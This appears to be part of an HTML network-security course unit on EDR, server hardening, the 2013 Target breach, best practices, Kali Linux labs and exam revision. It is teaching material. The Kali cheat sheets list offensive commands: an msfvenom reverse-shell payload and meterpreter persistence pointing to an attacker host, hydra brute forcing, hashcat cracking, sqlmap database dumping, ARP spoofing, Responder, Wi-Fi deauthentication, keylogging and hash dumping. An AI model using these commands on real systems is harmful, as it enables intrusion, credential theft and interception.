+└─$</span> <span class="cmd">tail -f /var/ossec/logs/alerts/alerts.log</span>  <span class="comment"># Live HIDS alerts</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Run <code>sudo lynis audit system</code> on your Kali VM. What is your hardening score? Implement 3 of the suggestions and re-run. Did your score improve?</li>
+      <li>Why does EDR detect fileless malware (living in memory) while traditional AV cannot?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Modern threats require modern defences. Traditional AV is the "last line" of a multi-layer defence — EDR is now the standard for any serious organisation. CrowdStrike and SentinelOne detected and stopped major threats that AV missed. On Linux, Lynis + auditd + ClamAV + OSSEC/Wazuh provides a solid open-source EDR-equivalent baseline.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T104 ===== -->
+<div class="sec" id="t104">
+  <div class="sh"><span class="sn">Topic 104</span><h2>Secure Network Design</h2><span class="se">🏗️</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Security Design Principles</h3>
+      <div class="cg2">
+        <div class="card"><div class="ci2">🛡️</div><div class="ct">Defence in Depth</div><div class="cd2">Layer multiple controls. No single point of failure in security. FW + IDS + EDR + SIEM.</div></div>
+        <div class="card"><div class="ci2">🔒</div><div class="ct">Least Privilege</div><div class="cd2">Every user, device, and service gets minimum required access. No standing admin rights.</div></div>
+        <div class="card"><div class="ci2">🎯</div><div class="ct">Reduce Attack Surface</div><div class="cd2">Close unused ports, disable unused services, remove unnecessary software. Less is more.</div></div>
+        <div class="card"><div class="ci2">🔄</div><div class="ct">Zero Trust</div><div class="cd2">Verify every request regardless of source. No implicit trust based on network location.</div></div>
+        <div class="card"><div class="ci2">🔀</div><div class="ct">Segmentation</div><div class="cd2">Separate systems by function and risk level. Limit blast radius of any breach.</div></div>
+        <div class="card"><div class="ci2">📋</div><div class="ct">Audit &amp; Monitor</div><div class="cd2">Log everything. If you can't measure it, you can't defend it. Centralise in SIEM.</div></div>
+        <div class="card"><div class="ci2">🔁</div><div class="ct">Fail Secure</div><div class="cd2">If a control fails, fail to closed (deny) not open. Default-deny firewall policy.</div></div>
+        <div class="card"><div class="ci2">📊</div><div class="ct">Visibility</div><div class="cd2">East-west traffic inspection (not just north-south). See lateral movement inside network.</div></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Network Hardening Checklist — Kali Linux Server</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">LINUX SERVER HARDENING — KALI</div></div>
+        <div class="term-body"><pre><span class="comment"># ── SSH hardening ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo nano /etc/ssh/sshd_config</span>
+<span class="cg">Port 2222                    # Non-standard port</span>
+<span class="cg">PermitRootLogin no           # No root SSH</span>
+<span class="cg">PasswordAuthentication no    # Key-based only</span>
+<span class="cg">MaxAuthTries 3</span>
+<span class="cg">AllowUsers alice bob</span>
+<span class="cg">Protocol 2</span>
+<span class="cg">X11Forwarding no</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo systemctl restart ssh</span>
+
+<span class="comment"># ── Fail2ban — auto-ban brute forcers ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install fail2ban</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo systemctl enable fail2ban --now</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo fail2ban-client status sshd</span>
+<span class="out">|- Currently banned:  3
+`- Banned IP list: 192.168.1.200 10.0.0.50 77.88.55.66</span>
+
+<span class="comment"># ── Disable unnecessary services ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo systemctl list-units --type=service --state=running</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo systemctl disable bluetooth.service --now</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo systemctl disable cups.service --now</span>  <span class="comment"># Disable printing daemon</span>
+
+<span class="comment"># ── File integrity monitoring with AIDE ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install aide</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo aideinit</span>         <span class="comment"># Build initial baseline database</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo aide --check</span>     <span class="comment"># Check for file changes since baseline</span>
+<span class="out">AIDE found differences between database and filesystem!
+Changed: /etc/passwd  ← ALERT: passwd file modified!</span>
+
+<span class="comment"># ── Network security checks ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo sysctl -w net.ipv4.conf.all.rp_filter=1</span>   <span class="comment"># Anti-spoof</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1</span>  <span class="comment"># No smurf</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo sysctl -w net.ipv4.conf.all.accept_redirects=0</span>  <span class="comment"># No ICMP redirects</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Run <code>sudo apt install fail2ban && systemctl enable fail2ban --now</code> on your Kali. Check the status after 1 hour. How many IPs were banned?</li>
+      <li>You run a web server. List 10 specific hardening steps in priority order.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Secure network design is preventative architecture. Every default-on service, every open port, every implicit trust relationship is a potential attack vector. Hardening — disabling unused services, patching, configuring fail2ban, enabling file integrity monitoring — is the systematic elimination of these attack paths.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T105 ===== -->
+<div class="sec" id="t105">
+  <div class="sh"><span class="sn">Topic 105</span><h2>Case Study: Target Breach 2013</h2><span class="se">📰</span></div>
+  <div class="sb">
+    <div class="sub"><h3>The Anatomy of the Target Breach</h3>
+      <div class="cb"><div class="clbl">TARGET BREACH 2013 — FULL ATTACK CHAIN</div><pre><span class="cy">Outcome:</span>  40M payment cards + 110M personal records stolen
+<span class="cy">Cost:</span>     $292M total — $18.5M settlement + $162M cybersecurity costs
+<span class="cy">Cause:</span>    Third-party HVAC vendor compromise
+
+<span class="cr">STEP 1: Phishing the HVAC Vendor (Fazio Mechanical)</span>
+  → Attacker sends phishing email to Fazio (HVAC contractor for Target)
+  → Employee opens malicious attachment → Citadel malware installed
+  → Attacker steals Fazio's credentials for Target's vendor portal
+
+<span class="cr">STEP 2: Pivoting to Target's Network</span>
+  → Fazio had remote access to Target's HVAC/refrigeration monitoring
+  → Attacker logs in with stolen Fazio credentials
+  → Target's network: HVAC systems on SAME network segment as POS systems!
+  <span class="cr">CRITICAL FAILURE: No network segmentation between vendor access and POS</span>
+
+<span class="cr">STEP 3: Lateral Movement to POS Systems</span>
+  → Attacker discovers 1,800+ POS terminals on the network
+  → Moves laterally — no internal firewall to stop this
+  → Installs custom BlackPOS RAM-scraping malware on POS devices
+
+<span class="cr">STEP 4: Data Exfiltration</span>
+  → BlackPOS malware scrapes card data from RAM (before encryption)
+  → Sends data to internal staging servers
+  → Data exfiltrated to external FTP servers in Russia
+  → Active from Nov 27 – Dec 15, 2013 (Black Friday to peak shopping!)
+  → FireEye alerted Target's team — alerts IGNORED!
+
+<span class="cg">LESSONS LEARNED:</span>
+  1. Network segmentation: HVAC ≠ POS network  [MISSING]
+  2. Third-party access review: what CAN vendors access?  [MISSING]
+  3. Least privilege: vendors get only what they need  [MISSING]
+  4. Respond to security alerts: FireEye fired — no action taken  [IGNORED]
+  5. Internal firewall between segments  [MISSING]
+  6. Payment card data should be encrypted at POS  [MISSING]</pre></div>
+    </div>
+    <div class="sub"><h3>Network Security Failures Mapped</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Stage</th><th>Security Failure</th><th>Control That Would Have Prevented It</th></tr></thead>
+        <tbody>
+          <tr><td>Initial Access</td><td>HVAC vendor lacked security awareness</td><td>Vendor security requirements, security training</td></tr>
+          <tr><td>Credential Theft</td><td>Fazio's system infected — credentials stolen</td><td>MFA on vendor portal access, EDR on vendor systems</td></tr>
+          <tr><td>Lateral Movement</td><td>Flat network: HVAC = POS access</td><td>Network segmentation, internal firewall</td></tr>
+          <tr><td>POS Compromise</td><td>POS systems reachable from vendor network</td><td>POS on dedicated isolated VLAN, application allowlisting</td></tr>
+          <tr><td>Data Exfiltration</td><td>Egress filtering not monitoring outbound anomalies</td><td>DLP, egress filtering, SIEM anomaly detection</td></tr>
+          <tr><td>Detection Failure</td><td>FireEye alerts ignored</td><td>SOC processes, alert escalation policy, 24/7 monitoring</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Redesign Target's network to prevent this attack. What segmentation would you implement? Draw a network diagram.</li>
+      <li>Who is responsible when a vendor's poor security leads to a breach of your organisation? What contractual and technical controls should exist?</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Target is the definitive case study for why network segmentation and third-party risk management are critical. A phishing email to an HVAC company resulted in 110 million records stolen. The breach was preventable at 6 different stages. The cost was $292 million and the CEO and CISO resigned. Security failures have real business consequences.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T106 ===== -->
+<div class="sec" id="t106">
+  <div class="sh"><span class="sn">Topic 106</span><h2>Best Practices</h2><span class="se">✅</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Network Security Best Practices Summary</h3>
+      <div class="tw"><table>
+        <thead><tr><th>Category</th><th>Best Practice</th><th>Kali Tool to Verify</th><th>Priority</th></tr></thead>
+        <tbody>
+          <tr><td>Scanning</td><td>Know your own attack surface before attackers do — scan regularly</td><td>nmap, Nessus, OpenVAS</td><td style="color:var(--red)">CRITICAL</td></tr>
+          <tr><td>Patching</td><td>Apply critical patches within 7 days. Automate where possible.</td><td>nmap --script vuln</td><td style="color:var(--red)">CRITICAL</td></tr>
+          <tr><td>Firewall</td><td>Default-deny. Only open needed ports. Review rules quarterly.</td><td>iptables -L -v -n</td><td style="color:var(--red)">CRITICAL</td></tr>
+          <tr><td>Authentication</td><td>MFA on everything. SSH keys not passwords. No default creds.</td><td>hydra (test brute resistance)</td><td style="color:var(--red)">CRITICAL</td></tr>
+          <tr><td>Segmentation</td><td>Separate network zones. IoT, guest, corp, servers isolated.</td><td>nmap (cross-segment scan)</td><td style="color:var(--orange)">HIGH</td></tr>
+          <tr><td>Monitoring</td><td>Log all traffic. SIEM. Alert on anomalies. 24/7 SOC.</td><td>Zeek, Suricata, Wireshark</td><td style="color:var(--orange)">HIGH</td></tr>
+          <tr><td>Encryption</td><td>TLS everywhere. VPN for remote. No plaintext protocols.</td><td>tcpdump (verify no plaintext)</td><td style="color:var(--orange)">HIGH</td></tr>
+          <tr><td>IDS/IPS</td><td>Deploy Snort/Suricata at network perimeter and key segments.</td><td>snort -c /etc/snort.conf</td><td style="color:var(--orange)">HIGH</td></tr>
+          <tr><td>EDR</td><td>Deploy EDR on all endpoints. Not just AV. Behavioural detection.</td><td>lynis, rkhunter, chkrootkit</td><td style="color:var(--orange)">HIGH</td></tr>
+          <tr><td>Incident Response</td><td>Written IR plan. Tested quarterly. Contacts established.</td><td>—</td><td style="color:var(--yellow)">MEDIUM</td></tr>
+          <tr><td>Vendor Management</td><td>Review third-party access. Least privilege. Monitor usage.</td><td>netstat (who's connected)</td><td style="color:var(--yellow)">MEDIUM</td></tr>
+          <tr><td>Training</td><td>Phishing simulation. Security culture. Report suspicious activity.</td><td>KnowBe4, GoPhish</td><td style="color:var(--yellow)">MEDIUM</td></tr>
+        </tbody>
+      </table></div>
+    </div>
+    <div class="sub"><h3>The Security Operations Mindset</h3>
+      <div class="ib g"><span class="bi">🎯</span><div><strong>Assume Breach Mentality:</strong> Don't build security as if you can prevent all breaches. Build it as if a breach is inevitable. Ask: "If an attacker is already inside, what can they reach? How quickly can we detect them? What can we do to limit the damage?" This mindset drives better segmentation, monitoring, and incident response — the controls that matter when prevention fails.</div></div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Perform a self-assessment of your home network against this best practices list. Score yourself 0-10. What are your top 3 gaps?</li>
+      <li>A company says "We can't afford cybersecurity tools." Counter this argument using the cost of the Target breach as a reference point.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Best practices are not theoretical ideals — they are lessons learned from real breaches. Every item on this list exists because organisations that didn't follow it got breached in a costly way. Security is an investment, not a cost. The question is not "Can we afford security?" but "Can we afford a breach?"</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T107 KALI LABS ===== -->
+<div class="sec" id="t107">
+  <div class="sh"><span class="sn">Topic 107</span><h2>Kali Linux Complete Lab Guide</h2><span class="se">🐉</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Essential Kali Tools Quick Reference</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">COMPLETE KALI CHEAT SHEET</div></div>
+        <div class="term-body"><pre><span class="comment">╔═══════════════════════════════════════════════════════════════╗
+║          KALI LINUX NETWORK SECURITY CHEAT SHEET             ║
+╚═══════════════════════════════════════════════════════════════╝</span>
+
+<span class="cy">━━━ INFORMATION GATHERING ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cg">nmap -sV -sC -O target</span>          <span class="comment"># Full version/script/OS scan</span>
+<span class="cg">nmap --script vuln target</span>        <span class="comment"># Vulnerability scan</span>
+<span class="cg">nmap -p- --min-rate 5000 target</span> <span class="comment"># All ports, fast</span>
+<span class="cg">rustscan -a target -- -sV -sC</span>   <span class="comment"># Rust-powered fast scan</span>
+<span class="cg">gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt</span>
+<span class="cg">ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirbuster/medium.txt</span>
+<span class="cg">nikto -h http://target</span>          <span class="comment"># Web vulnerability scan</span>
+<span class="cg">enum4linux -a target</span>             <span class="comment"># Windows/Samba enumeration</span>
+<span class="cg">smbclient -L //target -N</span>        <span class="comment"># List SMB shares</span>
+<span class="cg">rpcclient -U "" target</span>          <span class="comment"># RPC enumeration (no password)</span>
+
+<span class="cy">━━━ EXPLOITATION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="co">msfconsole</span>                        <span class="comment"># Launch Metasploit</span>
+<span class="co">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe</span>
+<span class="co">searchsploit apache 2.4</span>          <span class="comment"># Search Exploit-DB</span>
+<span class="co">sqlmap -u "http://target/?id=1" --dbs</span>  <span class="comment"># SQL injection</span>
+<span class="co">sqlmap -u "http://target/?id=1" -D dbname --tables</span>
+<span class="co">sqlmap -u "http://target/?id=1" -D dbname -T users --dump</span>
+
+<span class="cy">━━━ PASSWORD ATTACKS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cr">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target</span>
+<span class="cr">hydra -L users.txt -P passwords.txt ftp://target</span>
+<span class="cr">hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://target/admin</span>
+<span class="cr">hashcat -m 0 hash.txt rockyou.txt</span>     <span class="comment"># MD5</span>
+<span class="cr">hashcat -m 1000 hash.txt rockyou.txt</span>  <span class="comment"># NTLM</span>
+<span class="cr">hashcat -m 1800 hash.txt rockyou.txt</span>  <span class="comment"># SHA-512 crypt (Linux shadow)</span>
+<span class="cr">hashcat -m 22000 wpa.hccapx rockyou.txt</span>  <span class="comment"># WPA2</span>
+<span class="cr">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+
+<span class="cy">━━━ SNIFFING &amp; MITM ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cp">tcpdump -i eth0 -w capture.pcap</span>
+<span class="cp">wireshark &amp;</span>
+<span class="cp">arpspoof -i eth0 -t victim gateway</span>
+<span class="cp">ettercap -T -M arp:remote /victim// /gateway//</span>
+<span class="cp">bettercap -iface eth0</span>
+<span class="cp">responder -I eth0 -wrdv</span>
+
+<span class="cy">━━━ WIRELESS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="ci">airmon-ng start wlan0</span>             <span class="comment"># Enable monitor mode → wlan0mon</span>
+<span class="ci">airodump-ng wlan0mon</span>              <span class="comment"># Discover WiFi networks</span>
+<span class="ci">airodump-ng -c 6 --bssid TARGET_BSSID -w capture wlan0mon</span>  <span class="comment"># Capture</span>
+<span class="ci">aireplay-ng -0 5 -a TARGET_BSSID wlan0mon</span>  <span class="comment"># Deauth (force handshake)</span>
+<span class="ci">aircrack-ng -w rockyou.txt capture-01.cap</span>  <span class="comment"># Crack WPA2 handshake</span>
+<span class="ci">wifite</span>                            <span class="comment"># Automated WiFi attack tool</span>
+
+<span class="cy">━━━ POST EXPLOITATION ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="cg">meterpreter&gt; sysinfo</span>              <span class="comment"># System information</span>
+<span class="cg">meterpreter&gt; hashdump</span>             <span class="comment"># Dump Windows SAM hashes</span>
+<span class="cg">meterpreter&gt; screenshot</span>           <span class="comment"># Take screenshot</span>
+<span class="cg">meterpreter&gt; keyscan_start</span>        <span class="comment"># Start keylogger</span>
+<span class="cg">meterpreter&gt; getsystem</span>            <span class="comment"># Privilege escalation</span>
+<span class="cg">meterpreter&gt; upload /local/file /remote/path</span>
+<span class="cg">meterpreter&gt; persistence -U -i 30 -p 4444 -r attacker_ip</span>
+
+<span class="cy">━━━ PRIVILEGE ESCALATION (Linux) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="co">sudo -l</span>                           <span class="comment"># What can I run as sudo?</span>
+<span class="co">find / -perm -4000 2>/dev/null</span>    <span class="comment"># Find SUID binaries</span>
+<span class="co">cat /etc/crontab</span>                  <span class="comment"># Check cron jobs</span>
+<span class="co">linpeas.sh</span>                        <span class="comment"># Automated Linux privesc enumeration</span>
+<span class="co">winpeas.exe</span>                       <span class="comment"># Windows privesc enumeration</span>
+
+<span class="cy">━━━ CTF / LAB PLATFORMS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="out">HackTheBox (HTB):   app.hackthebox.com  — Real machine pentesting</span>
+<span class="out">TryHackMe (THM):    tryhackme.com       — Guided learning paths</span>
+<span class="out">VulnHub:            vulnhub.com         — Download vulnerable VMs</span>
+<span class="out">OWASP WebGoat:      Intentionally vulnerable web app (local)</span>
+<span class="out">PicoCTF:            picoctf.org         — CTF competitions</span></pre></div>
+      </div>
+    </div>
+    <div class="sub"><h3>Setting Up Kali Linux</h3>
+      <div class="terminal">
+        <div class="term-header"><div class="term-dots"><span class="r"></span><span class="y"></span><span class="g"></span></div><div class="term-title">KALI INITIAL SETUP</div></div>
+        <div class="term-body"><pre><span class="comment"># ── Update everything first ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt update && sudo apt full-upgrade -y</span>
+
+<span class="comment"># ── Install all tools ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install kali-linux-everything -y</span>  <span class="comment"># Full toolset (15GB)</span>
+
+<span class="comment"># ── Most useful individual installs ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo apt install gobuster rustscan feroxbuster crackmapexec bloodhound -y</span>
+
+<span class="comment"># ── Download rockyou wordlist ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo gunzip /usr/share/wordlists/rockyou.txt.gz</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">wc -l /usr/share/wordlists/rockyou.txt</span>
+<span class="out">14344391  ← 14.3 million common passwords</span>
+
+<span class="comment"># ── Connect to HackTheBox/TryHackMe lab ──</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">sudo openvpn ~/Downloads/hackthebox.ovpn</span>
+<span class="out">Initialization Sequence Completed  ← Connected to lab network</span>
+<span class="prompt">┌──(kali㉿kali)-[~]
+└─$</span> <span class="cmd">ping 10.10.10.5</span>   <span class="comment"># Verify connection to target machine</span></pre></div>
+      </div>
+    </div>
+    <div class="ex"><div class="el">🔬 Exercise</div><ol>
+      <li>Set up a Kali VM in VirtualBox/VMware. Update it fully. Then practice <code>nmap -sV localhost</code> and <code>ss -tulnp</code>. What do you find?</li>
+      <li>Register on TryHackMe.com. Complete the "Pre-Security" or "Intro to Networking" path using Kali Linux. Document 5 things you learned.</li>
+    </ol></div>
+    <div class="concl"><div class="cl">📌 Conclusion</div>
+      <p>Kali Linux is not just a collection of tools — it's a mindset. Every security professional should be comfortable with nmap, Wireshark, tcpdump, iptables, and the foundational attack tools. Practice in authorised lab environments (HackTheBox, TryHackMe, VulnHub). The hands-on experience is irreplaceable.</p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== T108 REVISION ===== -->
+<div class="sgt">📝 Revision</div>
+<div class="sec" id="t108">
+  <div class="sh"><span class="sn">Topic 108</span><h2>Unit 6 Revision Notes</h2><span class="se">📝</span></div>
+  <div class="sb">
+    <div class="sub"><h3>Quick Reference Glossary</h3>
+      <div class="rv">
+        <div class="ri"><span class="rt">Firewall</span><span class="rd">Filters traffic by rules. Stateful tracks state. NGFW = L7 DPI. Default-deny policy.</span></div>
+        <div class="ri"><span class="rt">IDS</span><span class="rd">Detects attacks, alerts only. Out-of-band. Snort, Suricata, Zeek. Signature + anomaly.</span></div>
+        <div class="ri"><span class="rt">IPS</span><span class="rd">Detects AND blocks inline. Real-time prevention. Risk: false positives block legit traffic.</span></div>
+        <div class="ri"><span class="rt">VPN</span><span class="rd">Encrypted tunnel. WireGuard = modern standard. Full vs split tunnel. Site-to-site vs remote access.</span></div>
+        <div class="ri"><span class="rt">Packet Sniffing</span><span class="rd">Capture network packets. Wireshark, tcpdump. Any plaintext protocol is readable.</span></div>
+        <div class="ri"><span class="rt">ARP Spoofing</span><span class="rd">Send fake ARP replies. Poison victim+gateway ARP tables. MitM position. Defence: DAI.</span></div>
+        <div class="ri"><span class="rt">DNS Spoofing</span><span class="rd">Return fake DNS responses. Redirect to phishing server. Defence: DNSSEC, DoH.</span></div>
+        <div class="ri"><span class="rt">MitM</span><span class="rd">Intercept + optionally modify traffic between two parties. bettercap, ettercap.</span></div>
+        <div class="ri"><span class="rt">DoS / DDoS</span><span class="rd">Overwhelm target with traffic. Single vs botnet/amplification. CDN for mitigation.</span></div>
+        <div class="ri"><span class="rt">SYN Flood</span><span class="rd">Exhaust TCP connection table with spoofed SYNs. Defence: SYN cookies, rate limiting.</span></div>
+        <div class="ri"><span class="rt">Amplification</span><span class="rd">Spoof source IP in small query → huge response hits victim. DNS=54x, NTP=556x, Memcached=51200x.</span></div>
+        <div class="ri"><span class="rt">Network Segmentation</span><span class="rd">VLANs isolate traffic. Limit lateral movement. Firewall between segments.</span></div>
+        <div class="ri"><span class="rt">Zero Trust</span><span class="rd">Never trust, always verify. Identity-centric. MFA everywhere. Assume breach.</span></div>
+        <div class="ri"><span class="rt">EDR</span><span class="rd">Endpoint Detection &amp; Response. Behavioural detection. Detects fileless malware.</span></div>
+        <div class="ri"><span class="rt">nmap</span><span class="rd">Port scanner. -sV=version, -sC=scripts, -A=aggressive, -p-=all ports, --script vuln=CVE scan.</span></div>
+        <div class="ri"><span class="rt">Wireshark</span><span class="rd">GUI packet analyser. Capture + filter. Decodes 2000+ protocols. Display filters.</span></div>
+        <div class="ri"><span class="rt">Metasploit</span><span class="rd">Exploitation framework. 2000+ exploits. msfconsole. msfvenom for payloads.</span></div>
+        <div class="ri"><span class="rt">Snort Rules</span><span class="rd">alert [proto] [src] [sport] -> [dst] [dport] (msg:"text"; sid:N;)</span></div>
+        <div class="ri"><span class="rt">iptables</span><span class="rd">Linux firewall. -P = policy, -A = append rule, -j = target (ACCEPT/DROP/LOG).</span></div>
+        <div class="ri"><span class="rt">DMZ</span><span class="rd">Demilitarised zone. Internet-facing servers. Two firewalls. Separated from internal.</span></div>
+        <div class="ri"><span class="rt">Responder</span><span class="rd">Windows network poisoning. Captures NTLMv2 hashes from LLMNR/NBT-NS queries.</span></div>
+        <div class="ri"><span class="rt">fail2ban</span><span class="rd">Auto-bans IPs after N failed auth attempts. Works with SSH, Apache, nginx, FTP.</span></div>
+        <div class="ri"><span class="rt">AIDE</span><span class="rd">Advanced Intrusion Detection Environment. File integrity monitoring. Baseline + check.</span></div>
+        <div class="ri"><span class="rt">DAI</span><span class="rd">Dynamic ARP Inspection. Switch validates ARP against DHCP snooping table. Blocks ARP spoofing.</span></div>
+        <div class="ri"><span class="rt">WireGuard</span><span class="rd">Modern VPN protocol. 4000 lines of code. ChaCha20 + Poly1305 + X25519. Fastest VPN.</span></div>
+      </div>
+    </div>
+    <div class="div"></div>
+    <div class="sub"><h3>Kali Commands Quick Reference</h3>
+      <div class="cb"><div class="clbl">KALI CHEAT SHEET</div><pre><span class="cy">RECON:</span>        <span class="cg">nmap -sV -sC target</span>  |  <span class="cg">gobuster dir -u URL -w wordlist</span>
+<span class="cy">VULN SCAN:</span>    <span class="cg">nmap --script vuln target</span>  |  <span class="cg">nikto -h http://target</span>
+<span class="cy">BRUTE FORCE:</span>  <span class="cr">hydra -l user -P rockyou.txt ssh://target</span>
+<span class="cy">SNIFF:</span>        <span class="cp">tcpdump -i eth0 -w out.pcap</span>  |  <span class="cp">wireshark</span>
+<span class="cy">MITM:</span>         <span class="cp">bettercap -iface eth0</span>  |  <span class="cp">arpspoof -i eth0 -t victim gw</span>
+<span class="cy">DNS ENUM:</span>     <span class="cg">dnsrecon -d domain -t std</span>  |  <span class="cg">dig domain ANY</span>
+<span class="cy">WIFI:</span>         <span class="ci">airmon-ng start wlan0</span>  →  <span class="ci">airodump-ng wlan0mon</span>  →  <span class="ci">aircrack-ng</span>
+<span class="cy">EXPLOIT:</span>      <span class="co">msfconsole</span>  →  <span class="co">search CVE</span>  →  <span class="co">use exploit</span>  →  <span class="co">run</span>
+<span class="cy">PASSWORDS:</span>    <span class="cr">hashcat -m [mode] hash.txt rockyou.txt</span>
+<span class="cy">FIREWALL:</span>     <span class="cg">sudo iptables -L -v -n</span>  |  <span class="cg">sudo ufw status verbose</span>
+<span class="cy">MONITOR:</span>      <span class="cg">ss -tulnp</span>  |  <span class="cg">lsof -i</span>  |  <span class="cg">iftop -i eth0</span>
+<span class="cy">VPN:</span>          <span class="cg">sudo wg-quick up wg0</span>  |  <span class="cg">sudo openvpn --config lab.ovpn</span>
+<span class="cy">HARDEN:</span>       <span class="cg">sudo lynis audit system</span>  |  <span class="cg">sudo rkhunter --check</span></pre></div>
+    </div>
+    <div class="div"></div>
+    <div class="sub"><h3>📋 Exam Practice Questions</h3>
+      <div class="tw"><table>
+        <thead><tr><th>#</th><th>Question</th><th>Marks</th><th>Key Points</th></tr></thead>
+        <tbody>
+          <tr><td>Q1</td><td>Compare packet-filtering, stateful, and NGFW firewalls. Give one limitation of each.</td><td>6</td><td>PF=no state; Stateful=blind to L7; NGFW=expensive; all can be bypassed via allowed ports</td></tr>
+          <tr><td>Q2</td><td>Explain the difference between IDS and IPS. Describe signature-based vs anomaly-based detection.</td><td>7</td><td>IDS=detect/alert; IPS=detect/block inline; sig=known attacks; anomaly=baseline deviation</td></tr>
+          <tr><td>Q3</td><td>Describe how an ARP spoofing attack enables a Man-in-the-Middle attack. How does Dynamic ARP Inspection prevent it?</td><td>7</td><td>Fake ARP → attacker in traffic path; DAI validates ARP against DHCP snooping table</td></tr>
+          <tr><td>Q4</td><td>What is a DDoS amplification attack? Calculate the traffic hitting a victim if 1Mbps of NTP queries is sent (amplification: 556x).</td><td>6</td><td>556 Mbps hits victim; spoofed source IP; reflectors send large responses; BCP38 prevents</td></tr>
+          <tr><td>Q5</td><td>Explain Zero Trust Security. How does it differ from traditional perimeter-based security?</td><td>6</td><td>Never trust always verify; identity-centric vs network-centric; micro-segmentation; MFA everywhere</td></tr>
+          <tr><td>Q6</td><td>Describe network segmentation. Design VLANs for a company with: employees, finance, IoT devices, and a web server.</td><td>8</td><td>4+ VLANs; internal firewall between; IoT isolated; web server in DMZ; finance restricted</td></tr>
+          <tr><td>Q7</td><td>Write a Snort IDS rule to detect an SSH brute force attack (5+ attempts in 60 seconds).</td><td>5</td><td>alert tcp any any -> $HOME_NET 22 (threshold:type both, track by_src, count 5, seconds 60; sid:X;)</td></tr>
+          <tr><td>Q8</td><td>What Kali Linux tool would you use for: (a) port scanning, (b) password cracking, (c) ARP spoofing, (d) web directory enumeration?</td><td>4</td><td>(a) nmap (b) hashcat/hydra (c) arpspoof/bettercap (d) gobuster/ffuf</td></tr>
+          <tr><td>Q9</td><td>Analyse the Target 2013 breach. Identify 4 network security controls that would have prevented or limited it.</td><td>8</td><td>Network segmentation; MFA for vendors; vendor access least privilege; SIEM alert response; egress filtering</td></tr>
